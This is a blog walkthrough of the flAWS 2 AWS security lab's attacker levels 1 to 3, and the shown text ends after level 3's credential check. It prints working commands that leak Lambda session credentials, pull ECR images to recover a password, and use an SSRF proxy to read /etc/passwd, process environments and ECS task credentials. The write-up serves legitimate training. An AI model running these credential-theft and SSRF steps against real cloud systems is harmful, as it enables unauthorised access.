<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="flAWS 2 - Attacker" /><meta property="og:locale" content="en" /><meta name="description" content="Level 1" /><meta property="og:description" content="Level 1" /><link rel="canonical" href="https://tanishq.page/blog/posts/flaws-2-attacker/" /><meta property="og:url" content="https://tanishq.page/blog/posts/flaws-2-attacker/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-13T00:42:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="flAWS 2 - Attacker" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-13T00:42:00-05:00","datePublished":"2023-05-13T00:42:00-05:00","description":"Level 1","headline":"flAWS 2 - Attacker","mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/flaws-2-attacker/"},"url":"https://tanishq.page/blog/posts/flaws-2-attacker/"}</script><title>flAWS 2 - Attacker | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/blog/">Tanishq Rupaal</a></h1><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>flAWS 2 - Attacker</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>flAWS 2 - Attacker</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1683956520" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 13, 2023 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1140 words" > <em>6 min</em> read</span></div></div></header><div class="content"><h2 id="level-1"><span class="me-2">Level 1</span><a href="#level-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>The problem statement is to enter a correct pin code on a website that is 100 digits long.</p></blockquote><p>The first thing to do is to look at the HTML source, where the form that takes the input submits to the following API Gateway URL ‚Üí</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
</pre></table></code></div></div><p>The source also has a JS construct with the following ‚Üí</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="kd">function</span> <span class="nf">validateForm</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="dl">"</span><span class="s2">myForm</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="o">!</span><span class="nf">isNaN</span><span class="p">(</span><span class="nf">parseFloat</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nf">isFinite</span><span class="p">(</span><span class="nx">code</span><span class="p">)))</span> <span class="p">{</span>
            <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Code must be a number</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Since the client-side validation code expects it to be a finite number, we can try bypassing that control and sending a string instead. We can do this using cURL. Doing so results in a malformed input error and spits out environment variables, likely due to developer errors, for the Lambda function handling the request. The returned environment JSON object can be pretty printed as follows ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="s2">"https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=qwer"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Error, malformed input"</span> | jq
</pre></table></code></div></div><p>We can explore the AWS environment using these session credentials. We can verify credentials as follows ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">"ASIAZ...."</span> <span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">"DEZBc...."</span> <span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">"IQoJb3JpZ2luX2V...."</span> aws sts get-caller-identity
</pre></table></code></div></div><p>which returns ‚Üí</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAIBATWWYQXZTTALNCE:level1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Account"</span><span class="p">:</span><span class="w"> </span><span class="s2">"653711331788"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:sts::653711331788:assumed-role/level1/level1"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>We can export the variables to the shell to make it easier.</p><p>Like flAWS-1, likely, the website is statically hosted via S3, so that should be the first exploration point. We can perform the following sequence of commands to explore S3 and find the next level ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>aws s3 <span class="nb">ls</span> <span class="c"># denied</span>
aws s3 <span class="nb">ls </span>s3://level1.flaws2.cloud <span class="c"># allowed and shows a secret file</span>
<span class="c"># download the secret file</span>
aws s3 <span class="nb">cp </span>s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html ./
</pre></table></code></div></div><p>The secret file contains the URL for the next level ‚Üí</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
</pre></table></code></div></div><hr /><h2 id="level-2"><span class="me-2">Level 2</span><a href="#level-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>Problem statement says that the level challenge is running as a container at URL http://container.target.flaws2.cloud/, and the associated ECR registry/repository name is ‚Äúlevel2‚Äù.</p></blockquote><p>The website in the container requests a login before returning any markup source. So, the only other available information is the ECR registry/repository name. With some thought, it has to be the repository name. It is also likely that the registry is publicly accessible, in which case we should be able to look at the image to figure out what web service is running and possibly look at credentials. We can also assume that the account is the same as what we discovered in level 1. So, we can also use the same CLI credentials.</p><p>First, check the access to the repository by listing all images as follows ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws ecr list-images <span class="nt">--repository-name</span> level2 <span class="nt">--registry-id</span> 653711331788
</pre></table></code></div></div><p>which returns ‚Üí</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"imageIds"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"imageDigest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"imageTag"</span><span class="p">:</span><span class="w"> </span><span class="s2">"latest"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>There‚Äôs only one image, likely the one that‚Äôs running the website, so we can list all layers of the image and pull them one by one to construct the container file system locally as follows ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws ecr batch-get-image <span class="nt">--repository-name</span> level2 <span class="nt">--registry-id</span> 653711331788 <span class="nt">--image-ids</span> <span class="s2">"imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"</span>
</pre></table></code></div></div><p>This gives a list of digests referring and relating to gzipped tarballs of image layers for the above image. We can retrieve each layer by using the <code class="language-plaintext highlighter-rouge">get-download-url-for-layer</code> sub-command. For multiple layers, let‚Äôs automate that with a quick for-loop ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nb">mkdir </span>image<span class="p">;</span> <span class="nb">cd </span>image
<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>awsn ecr batch-get-image <span class="nt">--repository-name</span> level2 <span class="nt">--registry-id</span> 653711331788 <span class="nt">--image-ids</span> <span class="s2">"imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"</span> | jq <span class="nt">-r</span> <span class="s1">'.images[0].imageManifest | fromjson | .layers[].digest'</span><span class="si">)</span>
<span class="k">do
    </span><span class="nb">echo</span> <span class="nv">$i</span>
    wget <span class="si">$(</span>awsn ecr get-download-url-for-layer <span class="nt">--registry-id</span> 653711331788 <span class="nt">--repository-name</span> level2 <span class="nt">--layer-digest</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> | jq <span class="nt">-r</span> <span class="s1">'.downloadUrl'</span><span class="si">)</span> <span class="nt">-O</span> <span class="nb">test
    tar</span> <span class="nt">-xzf</span> <span class="nb">test
</span><span class="k">done
</span><span class="nb">cd</span> ..
</pre></table></code></div></div><p>This creates the complete filesystem for the image. Since it‚Äôs a website, we can search for common web server applications like Apache or Nginx and password or credential files. I used <code class="language-plaintext highlighter-rouge">fdfind</code> for that, and a hit and try on the following led me to the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file for Nginx ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>fdfind apache <span class="nb">.</span> <span class="nt">-H</span>
fdfind nginx <span class="nb">.</span> <span class="nt">-H</span>
la ./etc/nginx
bat ./etc/nginx/.htpasswd
</pre></table></code></div></div><p>The last command gave the following ‚Üí</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flaws2:$apr1$jJh7fsij$wJV.a0WR6hAZ51/r11myl/
</pre></table></code></div></div><p>This is likely crackable but maybe not too. It‚Äôs better to turn to another method to obtain instructions per layer for the image. One way to do that is to use Docker to log in with the AWS credentials and use <code class="language-plaintext highlighter-rouge">docker inspect</code> on the pulled image. To log in to Docker with the AWS credentials, do the following ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>aws ecr get-login-password <span class="c"># spits off a token; export it as TOKEN</span>
docker login <span class="nt">-u</span> AWS <span class="nt">-p</span> <span class="nv">$TOKEN</span> 653711331788.dkr.ecr.us-east-1.amazonaws.com
</pre></table></code></div></div><p>Then, pull the image and look at its interpreted command history as follows ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
docker <span class="nb">history </span>653711331788.dkr.ecr.us-east-1.amazonaws.com/level2 <span class="nt">--no-trunc</span> | <span class="nb">grep </span>htpasswd
</pre></table></code></div></div><p>One of the commands there sets the <code class="language-plaintext highlighter-rouge">.htpasswd</code> as follows (which also gives us the password) ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>htpasswd <span class="nt">-b</span> <span class="nt">-c</span> /etc/nginx/.htpasswd flaws2 secret_password
</pre></table></code></div></div><p>Using these credentials in the containerized website gives the next level‚Äôs URL as ‚Üí</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/
</pre></table></code></div></div><hr /><h2 id="level-3"><span class="me-2">Level 3</span><a href="#level-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>The problem statement tells us that the container also has a simple proxy service running within and gives two examples to visit the fLAWS-1 URL and neverssl.com.</p></blockquote><p>The first impulse is to try the IMDSv1 endpoint in case the container was running within an EC2 instance. However, that didn‚Äôt produce any results. Looking at the image filesystem from the previous level, we can try to find the proxy code using <code class="language-plaintext highlighter-rouge">fdfind proxy . -H</code>, which shows a file available at <code class="language-plaintext highlighter-rouge">./var/www/html/proxy.py</code>. The proxy script takes the path and removes the leading <code class="language-plaintext highlighter-rouge">/</code>, and queries everything else as a URL.</p><p>Next, it‚Äôs likely the container is running as an ECS task. AWS <a href="https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html">states</a> that ECS tasks can have credentials that are retrievable from inside the container with ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl 169.254.170.2<span class="nv">$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</span>
</pre></table></code></div></div><p>Of course, this won‚Äôt directly work since the environment variable isn‚Äôt retrievable inside the Python code using the <code class="language-plaintext highlighter-rouge">$</code> denotation. So, we can try to retrieve that variable by other means. Trying another scheme like <code class="language-plaintext highlighter-rouge">file://</code> seems to work for the following payload ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://container.target.flaws2.cloud/proxy/file:///etc/passwd
</pre></table></code></div></div><p>Process environment variables can be listed via <code class="language-plaintext highlighter-rouge">/proc/&lt;PID&gt;/environ</code>, and we can try passing in <code class="language-plaintext highlighter-rouge">self</code> for the PID. The command would then look like ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://container.target.flaws2.cloud/proxy/file:///proc/self/environ <span class="nt">--output</span> -
</pre></table></code></div></div><p>This gives the result as ‚Üí</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HOSTNAME=ip-172-31-75-168.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/92a61680-599c-4b2d-ab9c-e8aa8cbe207fAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/9d3f98af337e441985892fa63d737081-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/9d3f98af337e441985892fa63d737081-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/9d3f98af337e441985892fa63d737081-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
</pre></table></code></div></div><p>With that information in hand, we can retrieve the credentials as follows ‚Üí</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/92a61680-599c-4b2d-ab9c-e8aa8cbe207f | jq
</pre></table></code></div></div><p>With those credentials, we get access to the following role ‚Üí</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AROAJQMBDNUMIKLZKMF64:9d3f98af337e441985892fa63d737081"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Account"</span><span class="p">:</span><span class="w"> </span><span class="s2">"653711331788"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:sts::653711331788:assumed-role/level3/9d3f98af337e441985892fa63d737081"</span><span class="w">
</span><span class="p">}</span><span class="w">
